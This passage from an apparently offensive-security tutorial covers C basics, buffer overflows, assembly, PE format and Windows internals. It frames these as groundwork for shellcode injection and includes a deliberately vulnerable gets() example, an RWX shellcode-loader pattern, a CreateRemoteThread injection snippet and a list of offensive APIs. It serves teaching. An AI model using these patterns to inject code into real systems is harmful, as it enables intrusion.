## Example: Greeting Function

```c
#include <stdio.h>

// This is a function
void sayHello() {
    printf("Hello!\n");
}

int main() {
    sayHello();    // Call the function
    sayHello();    // Call it again
    sayHello();    // And again
    
    return 0;
}
```

Output:
```
Hello!
Hello!
Hello!
```

We wrote the code once, but used it three times.

## Function with Parameters

Functions can receive values:

```c
#include <stdio.h>

void greet(char *name) {
    printf("Hello, %s!\n", name);
}

int main() {
    greet("Vamsi");
    greet("Krishna");
    greet("Ravi");
    
    return 0;
}
```

Output:
```
Hello, Vamsi!
Hello, Krishna!
Hello, Ravi!
```

## Function that Returns a Value

```c
#include <stdio.h>

int add(int a, int b) {
    int result = a + b;
    return result;
}

int main() {
    int sum = add(5, 3);
    printf("5 + 3 = %d\n", sum);
    
    int another = add(100, 200);
    printf("100 + 200 = %d\n", another);
    
    return 0;
}
```

Output:
```
5 + 3 = 8
100 + 200 = 300
```

## Example: Age Checker Function

```c
#include <stdio.h>

int canVote(int age) {
    if (age >= 18) {
        return 1;    // 1 means yes
    } else {
        return 0;    // 0 means no
    }
}

int main() {
    int myAge = 25;
    int friendAge = 16;
    
    if (canVote(myAge)) {
        printf("I can vote!\n");
    }
    
    if (canVote(friendAge)) {
        printf("My friend can vote!\n");
    } else {
        printf("My friend cannot vote yet.\n");
    }
    
    return 0;
}
```

Output:
```
I can vote!
My friend cannot vote yet.
```

## What Happens When You Call a Function?

Remember the stack from Chapter 9?

When you call a function:
1. The return address is pushed to stack (where to come back)
2. Function parameters are set up
3. Function runs
4. Function returns, return address is popped
5. Execution continues from return address

This is why buffer overflows are dangerous - they can overwrite the return address!

---

# CHAPTER 15: Arrays and Strings

## Introduction

What if you want to store many values? Use an array.

An array is a list of values in a row.

## Example: List of Numbers

```c
#include <stdio.h>

int main() {
    int scores[5];       // Array of 5 integers
    
    scores[0] = 90;      // First element (index 0)
    scores[1] = 85;
    scores[2] = 78;
    scores[3] = 92;
    scores[4] = 88;      // Last element (index 4)
    
    printf("First score: %d\n", scores[0]);
    printf("Last score: %d\n", scores[4]);
    
    // Print all scores
    for (int i = 0; i < 5; i++) {
        printf("Score %d: %d\n", i, scores[i]);
    }
    
    return 0;
}
```

Output:
```
First score: 90
Last score: 88
Score 0: 90
Score 1: 85
Score 2: 78
Score 3: 92
Score 4: 88
```

## Important: Arrays Start at Index 0

If you have 5 elements, the indexes are 0, 1, 2, 3, 4.

NOT 1, 2, 3, 4, 5.

This is a very common mistake for beginners.

## Memory Layout of an Array

In memory, array elements are next to each other:

```
Address:  1000    1004    1008    1012    1016
          [90]    [85]    [78]    [92]    [88]
          [0]     [1]     [2]     [3]     [4]
```

Each int is 4 bytes. So each element is 4 bytes apart.

## What is a String?

A string is an array of characters ending with a null byte (0).

```c
#include <stdio.h>

int main() {
    char name[10] = "Hello";
    
    // name contains: H, e, l, l, o, \0, ?, ?, ?, ?
    // \0 is the null byte (value 0)
    
    printf("String: %s\n", name);
    printf("First char: %c\n", name[0]);
    printf("Second char: %c\n", name[1]);
    
    return 0;
}
```

Output:
```
String: Hello
First char: H
Second char: e
```

## Memory Layout of "Hello"

```
Index:   0    1    2    3    4    5    6    7    8    9
Value:   H    e    l    l    o   \0    ?    ?    ?    ?
Hex:    48   65   6C   6C   6F   00    ??   ??   ??   ??
```

The \0 (null byte) tells functions like printf where the string ends.

## Example: Changing a String

```c
#include <stdio.h>

int main() {
    char name[10] = "Hello";
    
    printf("Before: %s\n", name);
    
    name[0] = 'J';    // Change H to J
    
    printf("After: %s\n", name);
    
    return 0;
}
```

Output:
```
Before: Hello
After: Jello
```

---

# CHAPTER 16: What is Buffer Overflow

## Introduction

This chapter is very important. It explains how many exploits work.

## What is a Buffer?

A buffer is just an array of bytes used to hold data.

When a program says "enter your name", it creates a buffer to store your input.

## The Problem

What if your buffer is 10 characters, but you type 20 characters?

```c
#include <stdio.h>
#include <string.h>

int main() {
    char password[8] = "secret";   // Password (should be secret)
    char name[10];                  // Buffer for name
    
    printf("Password in memory: %s\n", password);
    printf("Enter your name: ");
    
    gets(name);    // DANGEROUS! No limit on input
    
    printf("Hello, %s!\n", name);
    printf("Password in memory: %s\n", password);
    
    return 0;
}
```

## What Happens Normally?

If you type "Vamsi" (5 characters):
```
Enter your name: Vamsi
Hello, Vamsi!
Password in memory: secret
```

Everything is fine.

## What Happens With Long Input?

If you type "AAAAAAAAAAAAAAAAAA" (18 A's):
```
Enter your name: AAAAAAAAAAAAAAAAAA
Hello, AAAAAAAAAAAAAAAAAA!
Password in memory: AAAAAAA
```

The password got overwritten! The extra A's went into the password variable.

## Memory Layout Explanation

Before input:
```
Address:  100-109      110-117
Variable: name          password
Value:    [empty]       [secret]
```

After typing 18 A's:
```
Address:  100-109      110-117
Variable: name          password  
Value:    [AAAAAAAAAA] [AAAAAAAA]
          10 A's here   8 A's here (overflow!)
```

The name buffer overflowed into the password buffer.

## The Real Danger: Overwriting Return Address

Remember the stack from Chapter 9? Local variables are on the stack. The return address is also on the stack.

If you overflow enough, you can overwrite the return address.

```
Stack (before overflow):
-----------------------
| Return Address      |  <- Points to caller
-----------------------
| Saved Base Pointer  |
-----------------------
| name[0-9]           |  <- Your buffer
-----------------------

Stack (after overflow):
-----------------------
| AAAAAAAAAAAAAAAA    |  <- Return address is now 0x41414141 (AAAA)!
-----------------------
| AAAAAAAA            |
-----------------------
| AAAAAAA...          |
-----------------------
```

When the function returns, it tries to jump to 0x41414141 (which is "AAAA" in hex).

If you put a real address there instead of AAAA, the program jumps to that address.

If that address contains your shellcode... you win.

## Why This is the Foundation of Many Exploits

1. Find a buffer overflow vulnerability
2. Overwrite the return address with address of your shellcode
3. When function returns, it jumps to your shellcode
4. Your shellcode runs
5. You have control

## Modern Protections

Today, there are protections against this:
- **Stack canaries** - Special values that detect overflow
- **ASLR** - Randomizes addresses so you cannot predict them
- **DEP/NX** - Makes stack non-executable (shellcode cannot run directly from stack)

We will learn how to bypass these later. But you need to understand the basics first.

---

*End of Portion 4 - Chapters 11, 12, 13, 14, 15, 16*

*What you learned:*
- *How to set up C programming on Windows*
- *Variables are named boxes in memory*
- *Pointers hold memory addresses*
- *Functions are reusable blocks of code*
- *Arrays are lists of values in a row*
- *Strings are character arrays ending with null byte*
- *Buffer overflow happens when you write past the end of a buffer*
- *Overwriting return address can give you code execution*

*Next portion: How source code becomes an executable*

---

# PART 4: FROM SOURCE CODE TO EXECUTABLE

---

# CHAPTER 17: What is Compilation

## Introduction

You write code in C. The computer only understands bytes.

How does your code become a running program?

Answer: **Compilation**.

## The Journey of Your Code

```
Your C Code (.c file)
        ↓
    Preprocessor (handles #include)
        ↓
    Compiler (turns C into assembly)
        ↓
    Assembler (turns assembly into machine code)
        ↓
    Linker (combines everything into .exe)
        ↓
Executable File (.exe)
```

## Let Us Watch It Happen!

Create a file called `test.c`:

```c
#include <stdio.h>

int main() {
    int x = 5;
    int y = 3;
    int sum = x + y;
    printf("Sum: %d\n", sum);
    return 0;
}
```

**Step 1: See the preprocessed output**

```
cl /E test.c > preprocessed.txt
```

Open `preprocessed.txt`. You will see THOUSANDS of lines! The `#include <stdio.h>` got replaced with the entire contents of stdio.h.

**Step 2: See the assembly output**

```
cl /Fa test.c
```

This creates `test.asm`. Open it and you will see assembly code:

```asm
_main   PROC
        push    ebp
        mov     ebp, esp
        sub     esp, 12
        mov     DWORD PTR _x$[ebp], 5
        mov     DWORD PTR _y$[ebp], 3
        mov     eax, DWORD PTR _x$[ebp]
        add     eax, DWORD PTR _y$[ebp]
        mov     DWORD PTR _sum$[ebp], eax
        ...
```

This is what your `int sum = x + y;` became!

**Step 3: Create the final executable**

```
cl test.c
```

This creates `test.exe`. This is the final file Windows can run.

## What Each Step Does

| Step | Input | Output | What It Does |
|------|-------|--------|--------------|
| Preprocessor | .c file | Expanded .c | Replaces #include with file contents |
| Compiler | Expanded .c | .asm (assembly) | Translates C to assembly language |
| Assembler | .asm | .obj (object file) | Translates assembly to machine code |
| Linker | .obj files | .exe | Combines code and resolves function addresses |

## Why This Matters

1. **Shellcode is machine code** - The final bytes that the CPU executes
2. **Assembly helps you understand** - You can see exactly what instructions run
3. **Object files** - When you compile parts separately, then link them
4. **Symbols** - Function names and variable names exist until final linking

---

# CHAPTER 18: Assembly Language Fundamentals

## Introduction

Assembly is the human-readable form of machine code.

Each line of assembly becomes a few bytes of machine code.

## Why Learn Assembly?

- To understand shellcode
- To debug exploits
- To reverse engineer malware
- To write low-level code

You do not need to become an expert. Just understand the basics.

## Registers Refresh

Remember from Chapter 7, registers are fast storage inside the CPU:

| Register | Size | Common Use |
|----------|------|------------|
| RAX | 64-bit | Return values, general math |
| RBX | 64-bit | General purpose |
| RCX | 64-bit | Counter, 1st parameter (Windows) |
| RDX | 64-bit | 2nd parameter (Windows) |
| RSP | 64-bit | Stack pointer (top of stack) |
| RBP | 64-bit | Base pointer |
| RIP | 64-bit | Instruction pointer (next instruction) |
| R8-R15 | 64-bit | Extra registers |

**Smaller portions:**
- RAX (64-bit) → EAX (lower 32-bit) → AX (lower 16-bit) → AL (lower 8-bit)

## Basic Assembly Instructions

**Moving data:**
```asm
mov rax, 5        ; Put 5 in RAX
mov rbx, rax      ; Copy RAX to RBX (now RBX = 5)
mov [rax], rbx    ; Write RBX to memory address in RAX
mov rcx, [rax]    ; Read from memory address in RAX into RCX
```

**Math:**
```asm
add rax, 5        ; RAX = RAX + 5
sub rax, 3        ; RAX = RAX - 3
inc rax           ; RAX = RAX + 1
dec rax           ; RAX = RAX - 1
mul rbx           ; RAX = RAX * RBX
```

**Stack operations:**
```asm
push rax          ; Put RAX on stack, RSP goes down
pop rbx           ; Take value from stack into RBX, RSP goes up
```

**Function calls:**
```asm
call myFunction   ; Push return address, jump to myFunction
ret               ; Pop return address, jump there
```

**Comparisons and jumps:**
```asm
cmp rax, 5        ; Compare RAX with 5
je  label1        ; Jump to label1 if equal
jne label2        ; Jump to label2 if not equal
jmp label3        ; Always jump to label3
```

## Example: Our C Code in Assembly

This C code:
```c
int x = 5;
int y = 3;
int sum = x + y;
```

Becomes (simplified):
```asm
mov DWORD PTR [rbp-4], 5    ; x = 5 (store at stack location)
mov DWORD PTR [rbp-8], 3    ; y = 3 (store at stack location)
mov eax, DWORD PTR [rbp-4]  ; Load x into EAX
add eax, DWORD PTR [rbp-8]  ; Add y to EAX
mov DWORD PTR [rbp-12], eax ; Store result as sum
```

## Example: What printf("Hello") Looks Like

```asm
lea rcx, hello_string      ; Load address of "Hello" into RCX (1st param)
call printf                ; Call printf function
```

## Seeing It Yourself

Compile with debug info and disassemble:

**In Visual Studio Developer Command Prompt:**
```
cl /Zi test.c
dumpbin /disasm test.exe > disasm.txt
```

Open `disasm.txt` and search for `main`. You will see the actual assembly!

## Key Assembly Patterns to Recognize

**Function start (prologue):**
```asm
push rbp          ; Save old base pointer
mov rbp, rsp      ; Set up new base pointer
sub rsp, 32       ; Make space for local variables
```

**Function end (epilogue):**
```asm
add rsp, 32       ; Clean up local variables
pop rbp           ; Restore old base pointer
ret               ; Return to caller
```

**This is what buffer overflow attacks target!** They overwrite the saved return address.

---

# CHAPTER 19: The PE Executable Format

## Introduction

When you compile a program, you get an .exe file.

But what is inside that file?

The .exe file follows a specific format called **PE** (Portable Executable).

## Let Us Look Inside!

Open PowerShell and run:

```powershell
Format-Hex -Path "C:\Windows\notepad.exe" | Select-Object -First 50
```

You will see something like:
```
           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............
00000010   B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......
```

The first two bytes are `4D 5A` which is "MZ" in ASCII.

**Every Windows executable starts with "MZ"!**

## PE File Structure

```
┌─────────────────────────┐
│     DOS Header          │ ← Starts with "MZ" (0x4D 0x5A)
│     (64 bytes)          │
├─────────────────────────┤
│     DOS Stub            │ ← Old DOS program ("This program cannot...")
│     (variable size)     │
├─────────────────────────┤
│     PE Signature        │ ← "PE\0\0" (0x50 0x45 0x00 0x00)
├─────────────────────────┤
│     File Header         │ ← Basic info (machine type, number of sections)
│     (20 bytes)          │
├─────────────────────────┤
│     Optional Header     │ ← Entry point, image base, section alignment
│     (varies)            │
├─────────────────────────┤
│     Section Headers     │ ← Info about each section
│     (40 bytes each)     │
├─────────────────────────┤
│     Sections            │ ← Actual code and data:
│     .text  (code)       │   - .text = program code
│     .data  (data)       │   - .data = global variables
│     .rdata (read-only)  │   - .rdata = constants, import info
│     .rsrc  (resources)  │   - .rsrc = icons, strings
└─────────────────────────┘
```

## Important Parts for Us

**1. Entry Point**

This is the address where execution starts. When you double-click an .exe, Windows jumps to this address.

**2. Image Base**

The preferred address where the .exe wants to be loaded in memory.

64-bit programs usually: 0x0000000140000000
32-bit programs usually: 0x00400000

**3. Sections**

| Section | Contains | Permissions |
|---------|----------|-------------|
| .text | Program code | Read + Execute |
| .data | Variables that can change | Read + Write |
| .rdata | Constants | Read only |
| .rsrc | Resources (icons, etc) | Read only |

## Viewing PE Details with PowerShell

```powershell
# Get detailed PE information
$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\notepad.exe")

# DOS Header check
if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
    Write-Host "Valid DOS Header (MZ)" -ForegroundColor Green
}

# Find PE signature offset (at byte 0x3C in DOS header)
$peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
Write-Host "PE Header at offset: 0x$($peOffset.ToString('X'))"

# Check PE signature
if ($bytes[$peOffset] -eq 0x50 -and $bytes[$peOffset+1] -eq 0x45) {
    Write-Host "Valid PE Signature" -ForegroundColor Green
}
```

## Why PE Format Matters for Hacking

1. **Entry Point** - You can change where execution starts
2. **Sections** - You can add new sections with your code
3. **Import Table** - Lists which DLLs and functions the program uses
4. **Export Table** - Lists what functions the program provides

When you analyze malware, you look at the PE structure to understand:
- What functions does it call?
- Is there suspicious code hidden?
- Has it been modified from the original?

---

# CHAPTER 20: How Windows Loads a Program

## Introduction

You double-click notepad.exe. What actually happens?

Let us trace the entire journey step by step.

## Step 1: You Double-Click

When you double-click, Windows Explorer calls `CreateProcess()` with the path to notepad.exe.

## Step 2: Windows Reads the File

Windows opens notepad.exe and reads the PE headers:
- Checks the MZ and PE signatures
- Reads the entry point address
- Reads what sections exist
- Reads what DLLs are needed

## Step 3: Memory is Allocated

Windows creates a new process and allocates virtual memory:

```
User Space (available to notepad.exe):
┌─────────────────────────┐ 0x00007FFFFFFFFFFF
│                         │
│   Stack (grows down)    │
│                         │
├─────────────────────────┤
│   (free space)          │
├─────────────────────────┤
│   Heap (grows up)       │
├─────────────────────────┤
│   DLLs loaded here      │
│   kernel32.dll          │
│   ntdll.dll             │
│   user32.dll            │
├─────────────────────────┤
│   notepad.exe           │ ← Image loaded at base address
│   .text                 │
│   .data                 │
│   .rdata                │
├─────────────────────────┤ 0x0000000000000000

Kernel Space (not accessible to notepad.exe):
├─────────────────────────┤
│   Windows Kernel        │ ← Cannot touch this!
└─────────────────────────┘
```

## Step 4: The Image is Mapped

Windows copies each section from the file into memory:

- .text section → memory with Execute permission
- .data section → memory with Read+Write permission
- .rdata section → memory with Read permission

## Step 5: DLLs are Loaded

Notepad needs functions from DLLs (like MessageBox from user32.dll).

Windows loads each required DLL:
1. Find the DLL file
2. Map it into the process memory
3. Repeat for any DLLs that DLL needs

## Step 6: Imports are Resolved

The Import Table says: "I need MessageBoxW from user32.dll"

Windows:
1. Finds where user32.dll was loaded
2. Finds MessageBoxW in user32.dll's Export Table
3. Writes that address into notepad's Import Table

Now when notepad calls MessageBoxW, it knows exactly where to jump.

## Step 7: Entry Point is Called

Windows finally calls the entry point.

For a C program, this is NOT main()!

The actual entry point does setup work, then calls your main().

```
Windows calls → _mainCRTStartup()
                    ↓
                Sets up C runtime
                    ↓
                Calls your main()
                    ↓
                Your code runs!
```

## Step 8: Program Runs

The CPU starts executing instructions from the entry point.

Your program is now running!

## Watching It Happen

You can use Process Monitor (procmon) from Sysinternals to watch this:

1. Download Process Monitor from Microsoft Sysinternals
2. Set filter: "Process Name is notepad.exe"
3. Double-click notepad.exe
4. Watch all the file reads, registry access, and DLL loads!

## Why This Matters for Your Attack

When you inject shellcode:

1. You need **executable memory** - Windows normally does not let you execute data
2. You need to **bypass protections** - ASLR randomizes where things load
3. You need to **call APIs** - Your shellcode needs to find function addresses

Understanding how Windows loads programs helps you understand:
- Where to put your shellcode
- How to find API addresses
- What security is checking

---

*End of Portion 5 - Chapters 17, 18, 19, 20*

*What you learned:*
- *Compilation turns your C code into machine code through multiple steps*
- *Assembly is human-readable machine code*
- *PE format is how Windows executables are structured*
- *Windows loads programs by mapping sections, loading DLLs, and resolving imports*
- *The entry point is where execution begins*

*Next portion: Windows Internals (Processes, Threads, Virtual Memory, APIs, DLLs)*

---

# PART 5: WINDOWS INTERNALS

---

# CHAPTER 21: What is a Process

## Introduction

When you run a program, Windows creates a **process**.

A process is an isolated environment where the program runs.

## What a Process Actually Is

A process has:
- **Memory space** - Its own private memory (other programs cannot see it)
- **Handle table** - List of files, windows, and resources it has opened
- **At least one thread** - The actual execution
- **Security token** - What permissions it has

## See Processes Right Now

Open Task Manager (Ctrl+Shift+Esc) and go to "Details" tab.

Each row is a process. You can see:
- PID (Process ID) - Unique number for this process
- Name - The executable name
- Status - Running, Suspended, etc.
- Memory - How much RAM it uses

## Hands-On: Creating a Process in C

Let us write a program that creates another process (starts notepad):

```c
#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    // Initialize structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Create a new process (start notepad)
    BOOL success = CreateProcess(
        NULL,                   // Application name (NULL = use command line)
        "notepad.exe",         // Command line
        NULL,                   // Process security attributes
        NULL,                   // Thread security attributes
        FALSE,                  // Don't inherit handles
        0,                      // Creation flags (0 = normal)
        NULL,                   // Use parent's environment
        NULL,                   // Use parent's current directory
        &si,                    // Startup info
        &pi                     // Process information (output)
    );
    
    if (success) {
        printf("Notepad started!\n");
        printf("Process ID (PID): %d\n", pi.dwProcessId);
        printf("Thread ID (TID): %d\n", pi.dwThreadId);
        
        // Close handles (important to avoid resource leak)
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("Failed to start notepad. Error: %d\n", GetLastError());
    }
    
    return 0;
}
```

Compile and run:
```
cl create_process.c
create_process.exe
```

You will see notepad open, and your program prints the PID!

## Important Process Structures

**PROCESS_INFORMATION** gives us:
- `hProcess` - Handle to the new process
- `hThread` - Handle to its main thread
- `dwProcessId` - The PID
- `dwThreadId` - The main thread's ID

## Why Processes Matter for Hacking

1. **Process Injection** - We inject our code into another process
2. **Process Hollowing** - We replace a process's code with our own
3. **Process Memory** - We can read/write other processes' memory (with permission)

The `hProcess` handle is your key to interacting with a process!

## Hands-On: List All Processes

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to get process snapshot\n");
        return 1;
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    printf("%-10s %-30s\n", "PID", "Process Name");
    printf("==========================================\n");
    
    if (Process32First(snapshot, &pe)) {
        do {
            printf("%-10d %-30s\n", pe.th32ProcessID, pe.szExeFile);
        } while (Process32Next(snapshot, &pe));
    }
    
    CloseHandle(snapshot);
    return 0;
}
```

Run it and see all processes on your system!

---

# CHAPTER 22: What is a Thread

## Introduction

A process is like a house. A thread is a person living in that house doing work.

One house can have many people (one process can have many threads).

All threads in a process share the same memory, but each thread has its own:
- Stack (local variables)
- Registers (current state)
- Instruction pointer (where it is executing)

## Why Multiple Threads?

Imagine a browser:
- Thread 1: Handles button clicks
- Thread 2: Downloads files
- Thread 3: Plays video
- Thread 4: Renders the page

All running at the same time (or quickly switching between).

## Hands-On: Create a Thread in C

```c
#include <windows.h>
#include <stdio.h>

// This function runs in the new thread
DWORD WINAPI ThreadFunction(LPVOID lpParam) {
    int threadNum = *(int*)lpParam;
    
    for (int i = 0; i < 5; i++) {
        printf("Thread %d: Count %d\n", threadNum, i);
        Sleep(500);  // Wait 500 milliseconds
    }
    
    return 0;
}

int main() {
    int thread1Num = 1;
    int thread2Num = 2;
    
    printf("Main: Creating threads...\n");
    
    // Create first thread
    HANDLE hThread1 = CreateThread(
        NULL,           // Default security
        0,              // Default stack size
        ThreadFunction, // Function to run
        &thread1Num,    // Parameter to pass
        0,              // Run immediately
        NULL            // Don't need thread ID
    );
    
    // Create second thread
    HANDLE hThread2 = CreateThread(
        NULL,
        0,
        ThreadFunction,
        &thread2Num,
        0,
        NULL
    );
    
    printf("Main: Threads created! Waiting for them to finish...\n");
    
    // Wait for both threads to complete
    WaitForSingleObject(hThread1, INFINITE);
    WaitForSingleObject(hThread2, INFINITE);
    
    printf("Main: Both threads finished!\n");
    
    CloseHandle(hThread1);
    CloseHandle(hThread2);
    
    return 0;
}
```

Output:
```
Main: Creating threads...
Main: Threads created! Waiting for them to finish...
Thread 1: Count 0
Thread 2: Count 0
Thread 1: Count 1
Thread 2: Count 1
...
Main: Both threads finished!
```

The threads run at the same time!

## Why Threads Matter for Hacking

**CreateRemoteThread** - This is the key function for process injection!

It creates a thread in ANOTHER process:

```c
HANDLE hRemoteThread = CreateRemoteThread(
    hProcess,           // Handle to target process
    NULL,               // Default security
    0,                  // Default stack size
    startAddress,       // Where to start executing (your shellcode!)
    parameter,          // Parameter
    0,                  // Run immediately
    NULL                // Don't need thread ID
);
```

This makes the target process run YOUR code!

---

# CHAPTER 23: What is Virtual Memory

## Introduction

Every process thinks it has all the memory to itself.

Process A thinks it owns addresses 0 to 0x7FFFFFFFFFFF.
Process B ALSO thinks it owns addresses 0 to 0x7FFFFFFFFFFF.

But they have different data at the same addresses. How?

**Virtual memory.**

## How Virtual Memory Works

Each process has its own "address translation table" (page table).

When Process A reads address 0x1000:
- Windows translates 0x1000 → Physical address 0x50000
- Process A gets data from physical location 0x50000

When Process B reads address 0x1000:
- Windows translates 0x1000 → Physical address 0x80000 (different!)
- Process B gets different data

Same virtual address, different physical memory!

## Memory Permissions

Each memory region has permissions:

| Permission | Meaning |
|------------|---------|
| No Access | Cannot read/write/execute |
| Read | Can read but not write |
| Read/Write | Can read and write |
| Execute | Can execute as code |
| Read/Write/Execute | Can do everything (dangerous!) |

## Hands-On: Allocate Memory with VirtualAlloc

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Allocate 4096 bytes (one page) of memory
    LPVOID buffer = VirtualAlloc(
        NULL,                          // Let Windows choose address
        4096,                          // Size in bytes
        MEM_COMMIT | MEM_RESERVE,      // Allocate and commit the memory
        PAGE_READWRITE                 // Permissions: read + write
    );
    
    if (buffer == NULL) {
        printf("VirtualAlloc failed. Error: %d\n", GetLastError());
        return 1;
    }
    
    printf("Memory allocated at: %p\n", buffer);
    
    // Write something to it
    char* message = "Hello from allocated memory!";
    memcpy(buffer, message, strlen(message) + 1);
    
    // Read it back
    printf("Content: %s\n", (char*)buffer);
    
    // Free the memory
    VirtualFree(buffer, 0, MEM_RELEASE);
    printf("Memory freed.\n");
    
    return 0;
}
```

Output:
```
Memory allocated at: 0x000001A234560000
Content: Hello from allocated memory!
Memory freed.
```

## VirtualAlloc Parameters

| Parameter | Meaning |
|-----------|---------|
| `NULL` | Let Windows choose the address |
| `4096` | Size in bytes (must be page-aligned, 4096 is one page) |
| `MEM_COMMIT` | Actually allocate physical memory |
| `MEM_RESERVE` | Reserve address space |
| `PAGE_READWRITE` | Can read and write, but NOT execute |

## The Critical Permission: PAGE_EXECUTE_READWRITE

For shellcode, we need to EXECUTE the memory:

```c
LPVOID executableMemory = VirtualAlloc(
    NULL,
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE    // Can read, write, AND execute!
);
```

**This is how shellcode loaders work:**
1. Allocate memory with execute permission
2. Copy shellcode into that memory
3. Jump to that memory (execute it)

## Hands-On: Query Memory Information

```c
#include <windows.h>
#include <stdio.h>

int main() {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = (LPVOID)0x7FFE0000;  // Common system address
    
    if (VirtualQuery(address, &mbi, sizeof(mbi))) {
        printf("Address: %p\n", mbi.BaseAddress);
        printf("Region Size: %llu bytes\n", mbi.RegionSize);
        printf("State: ");
        
        switch (mbi.State) {
            case MEM_COMMIT: printf("Committed\n"); break;
            case MEM_FREE: printf("Free\n"); break;
            case MEM_RESERVE: printf("Reserved\n"); break;
        }
        
        printf("Protection: 0x%X\n", mbi.Protect);
    }
    
    return 0;
}
```

---

# CHAPTER 24: What is Windows API

## Introduction

Windows API (Application Programming Interface) is a set of functions that Windows provides.

When you want to:
- Open a file → Call CreateFile()
- Show a window → Call CreateWindowEx()
- Allocate memory → Call VirtualAlloc()
- Create a process → Call CreateProcess()

You ask Windows to do it through these functions.

## API Layers

```
Your Program
     ↓
kernel32.dll (High-level API)
     ↓
ntdll.dll (Low-level API, Nt* functions)
     ↓
SYSCALL instruction
     ↓
Windows Kernel (Does the actual work)
```

When you call CreateFile(), you are actually calling:
1. kernel32.dll!CreateFile()
2. Which calls ntdll.dll!NtCreateFile()
3. Which makes a syscall to the kernel
4. The kernel opens the file

## Hands-On: Calling Windows API

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Get current process ID
    DWORD pid = GetCurrentProcessId();
    printf("My Process ID: %d\n", pid);
    
    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    
    if (GetComputerNameA(computerName, &size)) {
        printf("Computer Name: %s\n", computerName);
    }
    
    // Get user name
    char userName[256];
    size = sizeof(userName);
    
    if (GetUserNameA(userName, &size)) {
        printf("User Name: %s\n", userName);
    }
    
    // Get current directory
    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);
    printf("Current Directory: %s\n", currentDir);
    
    // Get Windows version
    OSVERSIONINFO osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    
    // This is deprecated but shows the concept
    // GetVersionExA(&osvi);
    
    return 0;
}
```

## Important APIs for Offensive Work

**Memory:**
- `VirtualAlloc()` - Allocate memory
- `VirtualProtect()` - Change memory permissions
- `VirtualAllocEx()` - Allocate in another process
- `WriteProcessMemory()` - Write to another process

**Process/Thread:**
- `CreateProcess()` - Start a new process
- `OpenProcess()` - Get handle to existing process
- `CreateThread()` - Create thread in current process
- `CreateRemoteThread()` - Create thread in another process

**Module:**
- `GetModuleHandle()` - Get address where DLL is loaded
- `GetProcAddress()` - Get address of a function
- `LoadLibrary()` - Load a DLL

## Hands-On: Find Function Address

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Get handle to kernel32.dll
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    printf("kernel32.dll loaded at: %p\n", hKernel32);
    
    // Get address of VirtualAlloc function
    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    printf("VirtualAlloc is at: %p\n", pVirtualAlloc);
    
    // Get address of CreateProcessA
    LPVOID pCreateProcess = GetProcAddress(hKernel32, "CreateProcessA");
    printf("CreateProcessA is at: %p\n", pCreateProcess);
    
    // We can also get ntdll functions
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    printf("\nntdll.dll loaded at: %p\n", hNtdll);
    
    LPVOID pNtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    printf("NtAllocateVirtualMemory is at: %p\n", pNtAllocateVirtualMemory);
    
    return 0;
}
```

This is exactly how shellcode finds API addresses at runtime!

---

# CHAPTER 25: What is a DLL

## Introduction

DLL = Dynamic Link Library

A DLL is a file containing code and data that multiple programs can use.

Instead of every program having its own copy of "show a message box", they all share `user32.dll` which contains `MessageBox()`.

## Why DLLs Exist

1. **Saves memory** - One copy in RAM, many programs use it
2. **Saves disk space** - Not duplicated in every .exe
3. **Easy updates** - Update the DLL, all programs get the fix
4. **Modular code** - Separate pieces, easier to manage

## Important Windows DLLs

| DLL | Contains |
|-----|----------|
| kernel32.dll | Core Windows functions (files, memory, processes) |
| ntdll.dll | Low-level functions, syscall stubs |
| user32.dll | User interface (windows, messages, input) |
| gdi32.dll | Graphics (drawing, fonts, bitmaps) |
| advapi32.dll | Security, registry, services |
| ws2_32.dll | Network sockets |

## Hands-On: See What DLLs a Process Uses

In PowerShell:
```powershell
Get-Process notepad | Select-Object -ExpandProperty Modules | 
    Select-Object ModuleName, FileName, BaseAddress | 
    Format-Table -AutoSize
```

This shows all DLLs loaded by notepad!

## Hands-On: Load a DLL in C

```c
#include <windows.h>
#include <stdio.h>

int main() {
    printf("Loading user32.dll...\n");
    
    // Load the DLL
    HMODULE hUser32 = LoadLibrary("user32.dll");
    
    if (hUser32 == NULL) {
        printf("Failed to load. Error: %d\n", GetLastError());
        return 1;
    }
    
    printf("user32.dll loaded at: %p\n", hUser32);
    
    // Get address of MessageBoxA
    typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
    
    MessageBoxA_t pMessageBoxA = (MessageBoxA_t)GetProcAddress(hUser32, "MessageBoxA");
    
    if (pMessageBoxA) {
        printf("MessageBoxA is at: %p\n", pMessageBoxA);
        
        // Call it!
        pMessageBoxA(NULL, "Hello from loaded DLL!", "Test", MB_OK);
    }
    
    // Unload the DLL
    FreeLibrary(hUser32);
    printf("DLL unloaded.\n");
    
    return 0;
}
```

